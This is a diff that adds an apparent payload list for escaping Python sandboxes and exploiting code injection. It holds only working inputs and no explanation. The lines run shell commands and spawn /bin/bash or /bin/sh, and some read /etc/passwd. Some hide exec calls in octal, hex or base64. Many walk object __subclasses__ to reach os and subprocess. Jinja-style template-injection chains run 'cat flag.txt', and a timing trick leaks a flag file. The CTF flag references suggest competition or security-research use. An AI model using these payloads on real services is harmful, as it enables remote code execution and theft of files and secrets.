@@ -1,0 +1,97 @@
+os.system("ls")
+os.popen("ls").read()
+commands.getstatusoutput("ls") 
+commands.getoutput("ls")
+commands.getstatus("file/path")
+subprocess.call("ls", shell=True)
+subprocess.Popen("ls", shell=True)
+pty.spawn("ls")
+pty.spawn("/bin/bash")
+platform.os.system("ls")
+pdb.os.system("ls")
+importlib.import_module("os").system("ls")
+importlib.__import__("os").system("ls")
+imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
+imp.os.system("ls")
+imp.sys.modules["os"].system("ls")
+sys.modules["os"].system("ls")
+__import__("os").system("ls")
+import os
+from os import *
+open("/etc/passwd").read()
+open('/var/www/html/input', 'w').write('123')
+execfile('/usr/lib/python2.7/os.py')
+system('ls')
+exec()
+exec("print('RCE'); __import__('os').system('ls')") 
+exec("print('RCE')\n__import__('os').system('ls')")
+eval()
+eval("__import__('os').system('ls')") 
+eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) 
+__import__('timeit').timeit("__import__('os').system('ls')",number=1)
+eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
+exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
+exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
+exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
+exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) 
+exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
+[a:=21,a*2]
+[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
+__builtins__.__dict__["license"]._Printer__filenames=["flag"]
+a = __builtins__.help
+a.__class__.__enter__ = __builtins__.__dict__["license"]
+a.__class__.__exit__ = lambda self, *args: None
+__builtins__.__import__("os").system("ls")
+__builtins__.__dict__['__import__']("os").system("ls")
+__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
+__builtins__["__import__"]('os').system('ls')
+__builtins__["open"]("/etc/passwd").read()
+__builtins__["__import__"]("os").system("ls")
+"".__class__.__base__.__subclasses__()
+[].__class__.__base__.__subclasses__()
+{}.__class__.__base__.__subclasses__()
+().__class__.__base__.__subclasses__()
+(1).__class__.__base__.__subclasses__()
+bool.__class__.__base__.__subclasses__()
+print.__class__.__base__.__subclasses__()
+open.__class__.__base__.__subclasses__()
+defined_func.__class__.__base__.__subclasses__()
+"".__class__.__bases__[0].__subclasses__()
+"".__class__.__mro__[1].__subclasses__()
+"".__getattribute__("__class__").mro()[1].__subclasses__()
+"".__getattribute__("__class__").__base__.__subclasses__()
+(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
+(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
+[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
+[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
+[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
+{whoami.__class__.__dict__}
+{whoami.__globals__[os].__dict__}
+{whoami.__globals__[os].environ}
+{whoami.__globals__[sys].path}
+{whoami.__globals__[sys].modules}
+{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
+''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__['os'].system("ls")
+print(eval(eval('"alles.__".'+str(print.__class__)[9]+'ppe'+'r()')+'code__.co_consts'))
+[x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("ls")
+[].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('builtins').exec('print(123)',{'__builtins__':[x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('builtins')})
+[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0]()._module
+eval(input())
+input()
+__import__('time').sleep({} if open('/home/nullcon/flagpart1.txt').read({})[-1:] == '{}' else 0)
